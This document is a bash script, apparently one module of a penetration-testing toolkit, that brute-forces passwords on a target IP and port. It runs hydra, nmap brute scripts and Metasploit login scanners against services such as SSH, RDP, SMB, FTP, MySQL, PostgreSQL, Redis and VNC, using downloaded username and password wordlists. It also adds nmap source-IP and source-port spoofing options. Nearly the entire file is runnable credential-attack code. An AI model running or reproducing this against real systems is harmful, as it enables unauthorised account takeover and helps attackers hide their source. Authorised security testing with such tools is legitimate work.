#!/bin/bash
# Gather Password Information with Brute Force
# https://book.hacktricks.xyz/brute-force

####################
# Global variables #
####################

DEPENDENCIES="git gzip nmap hydra"

myPWFILE="output/password-findings-port-$PORT.txt"


################################
# Installation of Dependencies #
################################

if [ "$IAMROOT" ] && [ "$INET" ]; then
  install_deps
else
  print_message "Installation of dependencies skipped."
fi


###########################
# Create output directory #
###########################

if [ ! -d "output/" ]; then
  print_info "creating \"output/\" directory"
  mkdir output && echo "[ OK ]"
fi


################################
# Set NMAP Spoofing Parameters #
################################

function fuNmapSpoofingParameters {
  if [ "$NETDEVICE" != "" ] && [ "$SOURCEIP" != "" ] && [ "$SOURCEPORT" != "" ]; then
    echo "-e$NETDEVICE -S$SOURCEIP -g$SOURCEPORT"
  elif [ "$NETDEVICE" != "" ] && [ "$SOURCEIP" != "" ] && [ "$SOURCEPORT" == "" ]; then
    echo "-e$NETDEVICE -S$SOURCEIP"
  elif [ "$NETDEVICE" != "" ] && [ "$SOURCEIP" == "" ] && [ "$SOURCEPORT" != "" ]; then
    echo "-e$NETDEVICE -g$SOURCEPORT"
  elif [ "$NETDEVICE" != "" ] && [ "$SOURCEIP" == "" ] && [ "$SOURCEPORT" == "" ]; then
    echo "-e$NETDEVICE"
  elif [ "$NETDEVICE" == "" ] && [ "$SOURCEIP" != "" ] && [ "$SOURCEPORT" != "" ]; then
    echo "-S$SOURCEIP -g$SOURCEPORT"
  elif [ "$NETDEVICE" == "" ] && [ "$SOURCEIP" != "" ] && [ "$SOURCEPORT" == "" ]; then
    echo "-S$SOURCEIP"
  elif [ "$NETDEVICE" == "" ] && [ "$SOURCEIP" == "" ] && [ "$SOURCEPORT" != "" ]; then
    echo "-g$SOURCEPORT"
  else
    echo ""
  fi
}

# set nmap spoofing variable
SPOOFINGPARAMETERS=$(fuNmapSpoofingParameters)


#######################
# Prepare Brute Force #
#######################

print_info "Prepare word- and password lists"
git clone https://github.com/1N3/BruteX.git /usr/share/brutex/ 2>/dev/null
gzip -d /usr/share/wordlists/rockyou.txt.gz 2>/dev/null
#PWLIST="/usr/share/wordlists/rockyou.txt"
USERLIST="/usr/share/brutex/wordlists/simple-users.txt"
PWLIST="/usr/share/brutex/wordlists/password.lst"


###############################
# Brute Force Common Services #
###############################

# AFP
if [ "$IP" != "" ] && [ "$PORT" == "548" ]; then
  print_title "Nmap brute force with script afp-brute on $IP and port $PORT"
  nmap $IP -p $PORT --script afp-brute -oN $myPWFILE $SPOOFINGPARAMETERS
fi

# AJP
if [ "$IP" != "" ] && [ "$PORT" == "8009" ]; then
  print_title "Nmap brute force with script ajp-brute on $IP and port $PORT"
  nmap $IP -p $PORT --script ajp-brute -oN $myPWFILE $SPOOFINGPARAMETERS
fi

# Cassandra
if [ "$IP" != "" ] && [ "$PORT" == "9160" ]; then
  print_title "Nmap brute force with script cassandra-brute on $IP and port $PORT"
  nmap $IP -p $PORT --script cassandra-brute -oN $myPWFILE $SPOOFINGPARAMETERS
fi

# CouchDB
if [ "$IP" != "" ] && [ "$PORT" == "5984" ] && [ "$USERNAME" != "" ]; then
  # hydra
  print_title "Hydra brute force password on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME -P $PWLIST $IP -s $PORT http-get / -q -o $myPWFILE
  # msfconsole
  print_title "Brute force with msfconsole on $IP, port $PORT and username $USERNAME"
  msfconsole -x "use auxiliary/scanner/couchdb/couchdb_login; set rhost $IP; set username $USERNAME; exploit; exit;" -q -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "5984" ] && [ "$USERNAME" == "" ]; then
  # hydra
  print_title "Hydra brute force login/password pairs on $IP and port $PORT"
  hydra -L $USERLIST -P $PWLIST $IP -s $PORT http-get / -q -o $myPWFILE
  # msfconsole
  print_title "Brute force with msfconsole on $IP and port $PORT"
  msfconsole -x "use auxiliary/scanner/couchdb/couchdb_login; set rhost $IP; exploit; exit;" -q -o $myPWFILE
fi

# FTP
if [ "$IP" != "" ] && [ "$PORT" == "21" ] && [ "$USERNAME" != "" ]; then
  print_title "Hydra brute force login/password pairs on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME -P /usr/share/brutex/wordlists/ftp_defpass.lst $IP ftp -q -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "21" ] && [ "$USERNAME" == "" ]; then
  print_title "Hydra brute force login/password pairs on $IP, port $PORT and default ftp usernames"
  hydra -C /usr/share/brutex/wordlists/ftp-default-userpass.txt $IP ftp -q -o $myPWFILE
  hydra -L /usr/share/brutex/wordlists/ftp_defuser.lst -P /usr/share/brutex/wordlists/ftp_defpass.lst $IP ftp -o $myPWFILE
fi

# IMAP
if [ "$IP" != "" ] && [ "$PORT" == "993" ] && [ "$USERNAME" != "" ]; then
  print_title "Hydra brute force password on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME -P $PWLIST $IP imap -q -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "993" ] && [ "$USERNAME" == "" ]; then
  # hydra
  print_title "Hydra brute force login/password pairs on $IP and port $PORT"
  hydra -L $USERLIST -P $PWLIST $IP imap -q -o $myPWFILE
  # nmap
  print_title "Hydra brute force login/password pairs on $IP and port $PORT"
  nmap $IP -p $PORT -sV --script imap-brute -oN $myPWFILE $SPOOFINGPARAMETERS
fi

# IRC
if [ "$IP" != "" ] && [ "$PORT" == "6667" ]; then
  print_title "Nmap brute force with script irc-brute on $IP and port $PORT"
  nmap $IP -p $PORT -sV --script irc-brute,irc-sasl-brute -oN $myPWFILE $SPOOFINGPARAMETERS #--script-args userdb=/path/users.txt,passdb=/path/pass.txt
fi

# ISCSI
if [ "$IP" != "" ] && [ "$PORT" == "3260" ]; then
  print_title "Nmap brute force with script iscsi-brute on $IP and port $PORT"
  nmap $IP -p $PORT -sV --script iscsi-brute -oN $myPWFILE $SPOOFINGPARAMETERS #--script-args userdb=/path/users.txt,passdb=/path/pass.txt
fi

# LDAP
if [ "$IP" != "" ] && [ "$PORT" == "389" ]; then
  print_title "Nmap brute force with script ldap-brute on $IP and port $PORT"
  nmap $IP -p $PORT -sV --script ldap-brute -oN $myPWFILE $SPOOFINGPARAMETERS
fi

# Mongo
if [ "$IP" != "" ] && [ "$PORT" == "27017" ] && [ "$USERNAME" != "" ]; then
  # msfconsole
  print_title "Brute force with msfconsole on $IP, port $PORT and username $USERNAME"
  msfconsole -x "use auxiliary/scanner/mongodb/mongodb_login; set rhost $IP; set username $USERNAME; exploit; exit;" -q -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "27017" ] && [ "$USERNAME" == "" ]; then
  # nmap
  print_title "Nmap brute force with script mongodb-brute on $IP and port $PORT"
  nmap $IP -p $PORT -sV --script mongodb-brute -n -oN $myPWFILE $SPOOFINGPARAMETERS
  # msfconsole
  print_title "Brute force with msfconsole on $IP and port $PORT"
  msfconsole -x "use auxiliary/scanner/mongodb/mongodb_login; set rhost $IP; exploit; exit;" -q -o $myPWFILE
fi

# MySQL
if [ "$IP" != "" ] && [ "$PORT" == "3306" ] && [ "$USERNAME" != "" ]; then
  # msfconsole
  print_title "Brute force with msfconsole on $IP, port $PORT and username $USERNAME"
  msfconsole -x "use auxiliary/scanner/mysql/mysql_login; set VERBOSE false; set rhost $IP; set username $USERNAME; exploit; exit;" -q -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "3306" ] && [ "$USERNAME" == "" ]; then
  # hydra
  print_title "Hydra brute force username/password pairs on $IP and port $PORT"
  hydra -L $USERLIST -P $PWLIST $IP mysql -q -o $myPWFILE
  hydra -C /usr/share/brutex/wordlists/mysql-default-userpass.txt $IP mysql -q -o $myPWFILE
  # msfconsole
  print_title "Brute force with msfconsole on $IP and port $PORT"
  msfconsole -x "use auxiliary/scanner/mysql/mysql_login; set VERBOSE false; set rhost $IP; exploit; exit;" -q -o $myPWFILE
fi

# OracleSQL
if [ "$IP" != "" ] && [ "$PORT" == "1521" ]; then
  print_title "Nmap brute force with script oracle-brute on $IP and port $PORT"
  nmap $IP -p $PORT -sV --script oracle-brute -oN $myPWFILE $SPOOFINGPARAMETERS
  #nmap $IP -p $PORT --script oracle-brute --script-args oracle-brute.sid=$SID -oN $myPWFILE
fi

# POP
if [ "$IP" != "" ] && [ "$PORT" == "995" ] && [ "$USERNAME" != "" ]; then
  print_title "Hydra brute force password on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME -P $PWLIST $IP pop3 -q -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "995" ] && [ "$USERNAME" == "" ]; then
  print_title "Hydra brute force login/password pairs on $IP and port $PORT"
  hydra -L $USERLIST -P $PWLIST $IP pop3 -q -o $myPWFILE
fi

# PostgreSQL
if [ "$IP" != "" ] && [ "$PORT" == "5432" ] && [ "$USERNAME" != "" ]; then
  # hydra
  print_title "Hydra brute force password on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME -P $PWLIST $IP postgres -q -o $myPWFILE
  # msfconsole
  print_title "Brute force with msfconsole on $IP, port $PORT and username $USERNAME"
  msfconsole -x "use auxiliary/scanner/postgres/postgres_login; set rhost $IP; set username $USERNAME; exploit; exit;" -q -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "5432" ] && [ "$USERNAME" == "" ]; then
  # hydra
  print_title "Hydra brute force password on $IP and port $PORT"
  hydra -L $USERLIST -P $PWLIST $IP postgres -q -o $myPWFILE
  # msfconsole
  print_title "Brute force with msfconsole on $IP and port $PORT"
  msfconsole -x "use auxiliary/scanner/postgres/postgres_login; set rhost $IP; exploit; exit;" -q -o $myPWFILE
  # nmap
  print_title "Nmap brute force with script pqsql-brute on $IP and port $PORT"
  nmap $IP -p $PORT -sV --script pgsql-brute --script-args userdb=$USERLIST,passdb=$PWLIST -oN $myPWFILE $SPOOFINGPARAMETERS
fi

# RDP
if [ "$IP" != "" ] && [ "$PORT" == "3389" ] && [ "$USERNAME" != "" ]; then
  print_title "Hydra brute force password on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME -P $PWLIST rdp://$IP -q -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "3389" ] && [ "$USERNAME" == "" ]; then
  print_title "Hydra brute force login/password pairs on $IP and port $PORT"
  hydra -L $USERLIST -P $PWLIST rdp://$IP -q -o $myPWFILE
fi

# Redis
if [ "$IP" != "" ] && [ "$PORT" == "6379" ] && [ "$USERNAME" != "" ]; then
  print_title "Hydra brute force password on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME -P $PWLIST redis://$IP:$PORT -q -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "6379" ] && [ "$USERNAME" == "" ]; then
  print_title "Hydra brute force login/password pairs on $IP and port $PORT"
  hydra -P $PWLIST redis://$IP:$PORT -q -o $myPWFILE
fi

# Rexec
if [ "$IP" != "" ] && [ "$PORT" == "512" ] && [ "$USERNAME" != "" ]; then
  print_title "Hydra brute force password on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME -P $PWLIST rexec://$IP -q -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "512" ] && [ "$USERNAME" == "" ]; then
  # hydra
  print_title "Hydra brute force login/password pairs on $IP and port $PORT"
  hydra -L $USERLIST -P $PWLIST rexec://$IP -q -o $myPWFILE
  # nmap
  print_title "Nmap brute force with script rexec-brute on $IP and port $PORT"
  nmap $IP -p $PORT -sV --script rexec-brute -oN $myPWFILE $SPOOFINGPARAMETERS
fi

# Rlogin
if [ "$IP" != "" ] && [ "$PORT" == "513" ] && [ "$USERNAME" != "" ]; then
  print_title "Hydra brute force password on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME -P $PWLIST rlogin://$IP -q -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "513" ] && [ "$USERNAME" == "" ]; then
  print_title "Hydra brute force login/password pairs on $IP and port $PORT"
  hydra -L $USERLIST -P $PWLIST rlogin://$IP -q -o $myPWFILE
fi

# Rsh
if [ "$IP" != "" ] && [ "$PORT" == "514" ] && [ "$USERNAME" != "" ]; then
  print_title "Hydra brute force password on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME rsh://$IP -q -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "514" ] && [ "$USERNAME" == "" ]; then
  print_title "Hydra brute force login/password pairs on $IP and port $PORT"
  hydra -L $USERLIST rsh://$IP -q -o $myPWFILE
fi

# Rsync
if [ "$IP" != "" ] && [ "$PORT" == "873" ]; then
  print_title "Nmap brute force with script rsync-brute on $IP and port $PORT"
  nmap $IP -p $PORT -sV --script rsync-brute --script-args userdb=$USERLIST,passdb=$PWLIST -oN $myPWFILE $SPOOFINGPARAMETERS
fi

# RTSP
if [ "$IP" != "" ] && [ "$PORT" == "554" ] && [ "$USERNAME" != "" ]; then
  print_title "Hydra brute force password on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME -P $PWLIST $IP rtsp -q -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "554" ] && [ "$USERNAME" == "" ]; then
  print_title "Hydra brute force password on $IP, port $PORT and user root"
  hydra -l root -P $PWLIST $IP rtsp -q -o $myPWFILE
fi

# SNMP
if [ "$IP" != "" ] && ( [ "$PORT" == "161" ] || [ "$PORT" == "162" ] ) && [ "$USERNAME" != "" ]; then
  print_title "Hydra brute force password on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP snmp -q -o $myPWFILE

elif [ "$IP" != "" ] && ( [ "$PORT" == "161" ] || [ "$PORT" == "162" ] ) && [ "$USERNAME" == "" ]; then
  print_title "Hydra brute force password on $IP and port $PORT"
  hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP snmp -q -o $myPWFILE
fi

# SMB
if [ "$IP" != "" ] && [ "$PORT" == "445" ] && [ "$USERNAME" != "" ]; then
  print_title "Hydra brute force password on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME -P $PWLIST $IP smb -q -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "445" ] && [ "$USERNAME" == "Administrator" ]; then
  # hydra
  print_title "Hydra brute force password on $IP, port $PORT and username Administrator"
  hydra -l Administrator -P $PWLIST $IP smb -q -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "445" ] && [ "$USERNAME" == "" ]; then
  # hydra
  print_title "Hydra brute force password on $IP and port $PORT"
  hydra -L $USERLIST -P $PWLIST $IP smb -q -o $myPWFILE
  # nmap
  print_title "Nmap brute force with script smb-brute on $IP and port $PORT"
  nmap $IP -p $PORT -sV --script smb-brute -oN $myPWFILE $SPOOFINGPARAMETERS
fi

# SMTP
if [ "$IP" != "" ] && [ "$PORT" == "25" ] && [ "$USERNAME" != "" ]; then
  # hydra
  print_title "Hydra brute force password on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME -P $PWLIST $IP smtp -q -o $myPWFILE
  # nmap
  print_title "Nmap brute force with script smtp-brute on $IP and port $PORT"
  nmap $IP -p $PORT -sV --script smtp-brute -oN $myPWFILE $SPOOFINGPARAMETERS

elif [ "$IP" != "" ] && ( [ "$PORT" == "465" ] || [ "$PORT" == "587" ] ) && [ "$USERNAME" != "" ]; then
  # hydra
  print_title "Hydra brute force password on $IP, port $PORT and username $USERNAME with an SSL connect"
  hydra -l $USERNAME -P $PWLIST $IP smtp -S -q -o $myPWFILE
  # nmap
  print_title "Nmap brute force with script smtp-brute on $IP and port $PORT"
  nmap $IP -p $PORT -sV --script smtp-brute -oN $myPWFILE $SPOOFINGPARAMETERS

elif [ "$IP" != "" ] && [ "$PORT" == "25" ] && [ "$USERNAME" == "" ]; then
  # hydra
  print_title "Hydra brute force password on $IP and port $PORT"
  hydra -L /usr/share/brutex/wordlists/smtp_defuser.lst -P /usr/share/brutex/wordlists/smtp_defpass.lst $IP smtp -q -o $myPWFILE
fi

# SOCKS
if [ "$IP" != "" ] && [ "$PORT" == "1080" ]; then
  print_title "Nmap brute force with script socks-brute on $IP and port $PORT"
  nmap $IP -p $PORT -sV --script socks-brute --script-args userdb=$USERLIST,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -oN $myPWFILE $SPOOFINGPARAMETERS
fi

# MS-SQL Server
if [ "$IP" != "" ] && [ "$PORT" == "1433" ] && [ "$USERNAME" != "" ]; then
  print_title "Hydra brute force password on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME -P $PWLIST $IP mssql -q -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "1433" ] && [ "$USERNAME" == "" ]; then
  # hydra
  print_title "Hydra brute force password on $IP and port $PORT"
  hydra -L $USERLIST -P $PWLIST $IP mssql -q -o $myPWFILE
  # nmap
  print_title "Nmap brute force with script ms-sql-brute on $IP and port $PORT"
  nmap $IP -p $PORT -sV --script ms-sql-brute --script-args userdb=$USERLIST,passdb=$PWLIST,ms-sql-brute.brute-windows-accounts -oN $myPWFILE $SPOOFINGPARAMETERS
fi

# SSH
if [ "$IP" != "" ] && [ "$PORT" == "22" ] && [ "$USERNAME" != "" ]; then
  print_title "Hydra brute force password on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME -P $PWLIST $IP ssh -q -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "22" ] && [ "$USERNAME" == "root" ]; then
  print_title "Hydra brute force password on $IP, port $PORT and username root"
  hydra -l root -P $PWLIST $IP ssh -q -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "22" ] && [ "$USERNAME" == "" ]; then
  print_title "Hydra brute force password on $IP and port $PORT"
  hydra -L $USERLIST -P $PWLIST $IP ssh -q -o $myPWFILE
fi

# Telnet
if [ "$IP" != "" ] && [ "$PORT" == "23" ] && [ "$USERNAME" != "" ]; then
  print_title "Hydra brute force password on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME -P $PWLIST $IP telnet -q -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "23" ] && [ "$USERNAME" == "root" ]; then
  print_title "Hydra brute force password on $IP, port $PORT and username root"
  hydra -l root -P $PWLIST $IP telnet -q -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "23" ] && [ "$USERNAME" == "" ]; then
  print_title "Hydra brute force password on $IP and port $PORT"
  hydra -L $USERLIST -P $PWLIST $IP telnet -q -o $myPWFILE
fi

# VNC
if [ "$IP" != "" ] && ( [ "$PORT" == "5800" ] || [ "$PORT" == "5801" ] || [ "$PORT" == "5900" ] || [ "$PORT" == "5901" ] ) && [ "$USERNAME" != "" ]; then
  print_title "Hydra brute force password on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME -P $PWLIST -s $PORT $IP vnc -q -o $myPWFILE

elif [ "$IP" != "" ] && ( [ "$PORT" == "5800" ] || [ "$PORT" == "5801" ] || [ "$PORT" == "5900" ] || [ "$PORT" == "5901" ] ) && [ "$USERNAME" == "" ]; then
  print_title "Hydra brute force password on $IP and port $PORT"
  hydra -L $USERLIST -P $PWLIST -s $PORT $IP vnc -q -o $myPWFILE
fi


#####################
# Summarize results #
#####################

print_title "Findings in following files:"

if [ -s "$myPWFILE" ]; then
  print_result "Passwords may have been found in: $myPWFILE"
else
  #NOPW=true
  print_error "No passwords found"
fi
echo